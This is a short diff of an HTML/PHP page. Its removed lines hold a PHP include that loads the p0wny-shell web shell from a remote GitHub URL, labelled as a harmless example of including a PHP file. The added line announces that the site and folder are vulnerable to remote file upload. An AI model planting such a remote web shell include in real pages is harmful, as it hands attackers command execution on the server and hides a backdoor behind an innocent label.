@@ -1,8 +1,7 @@
 <html>
    <body>
    
-      <?php include("https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php"); ?>
-      <p>This is an example to show how to include PHP file!</p>
+      <p>This website and Folder are Vulnerable to Remote File Upload</p>
       
    </body>
 </html>
